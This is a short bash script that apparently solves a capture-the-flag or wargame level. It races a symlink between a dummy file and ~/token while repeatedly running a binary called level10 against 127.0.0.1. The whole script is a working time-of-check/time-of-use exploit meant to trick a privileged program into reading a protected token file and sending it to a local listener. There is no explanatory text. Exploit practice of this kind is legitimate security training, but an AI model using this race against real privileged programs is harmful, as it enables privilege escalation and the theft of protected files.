#!/bin/bash
echo "kek" > /tmp/lel
while true
do
	ln -fs /tmp/lel /tmp/foo
	~/level10 /tmp/foo 127.0.0.1 &
	i=0;
	while [[ "$i" -le "500" ]]
	do
		i=$((i + 1))
	done
	ln -fs ~/token /tmp/foo
done
